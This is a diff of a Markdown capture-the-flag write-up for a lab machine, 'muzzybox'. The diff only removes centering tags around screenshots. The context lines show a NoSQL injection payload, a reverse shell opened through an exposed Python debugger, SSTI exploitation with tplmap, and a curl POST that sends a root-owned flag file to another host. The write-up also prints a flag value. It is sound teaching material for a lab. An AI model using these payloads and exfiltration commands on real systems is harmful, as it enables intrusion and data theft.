@@ -53,68 +53,48 @@ Nmap done: 1 IP address (1 host up) scanned in 7.86 seconds
 
 We have http server running on 3 different ports. I decided to look at the port 80 first. The index.txt at port 80 shows all the challenges we have to solve in this machine.
 
-<center><br>
 <img src="/assets/img/uploads/muzzybox/index.png">
-</center>
 
 ## Challenge 1
 
 <p align="justify"> The first challenge is to bypass the Washington State University idcard database. The developers of the library have implemented a security measure to prevent unauthorized access. They have used an alternative of SQL DB to secure the database. The process to enter the library is to upload the idcard on this page and then the access is allowed. </p>
 
-<center><br>
 <img src="/assets/img/uploads/muzzybox/port3000.png">
-</center>
 
 There is a sample ID Card image at <i>http://muzzybox:9633/idcard.png</i> which has a column for Name, Position and Access Level.
 
-<center><br>
 <img src="/assets/img/uploads/muzzybox/idcard-sample.png">
-</center>
 
 First I tried to upload the id card as such to understand the workflow of the web application. I found that the application reads all the text written on the idcard, and our access level comes to be unauthorized.
 
-<center><br>
 <img src="/assets/img/uploads/muzzybox/idcard-upload.png">
-</center>
 
 If we look again at the description of the challenge, we can see that only the <b>Principal</b> is authorized.
 
-<center><br>
 <img src="/assets/img/uploads/muzzybox/challenge1.png">
-</center>
 
 To gain access, to the library, I downloaded the sample ID card image, and changed the 'Position' to <b>Principal</b> and 'Access Level' to <b>authorized</b> in an image editing software (I used GIMP for that) 
 
-<center><br>
 <img src="/assets/img/uploads/muzzybox/idcard.png">
-</center>
 
 <p align="justify"> Additionally, I also added a `{$ne:1}` with the name because as we know they are using an alternate of SQL DB ie in MongoDB or NoSQL injection, if you supply input with "{$ne:1}" (Logical Operator), the database will dump all users which values are not equal to 1 and it will become True value. The upload was a success and we got our first flag: <br>
 <b>N$ctF{D388uG_P!N_!$_123-456-789}</b> </p>
 
-<center><br>
 <img src="/assets/img/uploads/muzzybox/challenge1-flag.png">
-</center>
 
 ## Challenge 2
 
 The next challenge is to exploit their new website which is currently under maintenance. The goal was to list the current directory and read the flag.
 
-<center><br>
 <img src="/assets/img/uploads/muzzybox/challenge2.png">
-</center>
 
 If we look at the port 8989, there was a python debugger running on the website.
 
-<center><br>
 <img src="/assets/img/uploads/muzzybox/port8989.png">
-</center>
 
 After clicking on the console button on the right, a popup window came up asking for a pin to use the code. The pin we need was in the previous flag. 
 
-<center><br>
 <img src="/assets/img/uploads/muzzybox/console-password.png">
-</center>
 
 This opens a console where we can execute any python command. I used the following shellcode to open a reverse shell from the target machine. 
 
@@ -170,15 +150,11 @@ webpy@muzzy:~/flag$
 
 The next challenge is to get root access on the machine by exploiting the <i>ls</i> command.
 
-<center><br>
 <img src="/assets/img/uploads/muzzybox/challenge3.png">
-</center>
 
 There is a simple web application running at port 15000 which displays the name we provide in the URL. This page is vulnerable to <abbr title="Server Side Template Injection">SSTI</abbr>
 
-<center><br>
 <img src="/assets/img/uploads/muzzybox/port15000.png">
-</center>
 
 To get a shell on the target machine by exploiting the <abbr title="Server Side Template Injection">SSTI</abbr> Vulnerability, I used a tool named <a href="https://github.com/epinna/tplmap">tplmap.</a> This is available freely on the Github.
 
@@ -242,9 +218,8 @@ I used the curl command to send a POST request to the target machine to read the
 ```r
 nsctf@muzzy:~$ nano /usr/local/sbin/ls
 ```
-<center>
+
 <img src="/assets/img/uploads/muzzybox/post-request.png">
-</center>
 
 ```r
 curl -i -X POST "http://192.168.1.5:9000" --data "@/root/Final_Flag.txt"
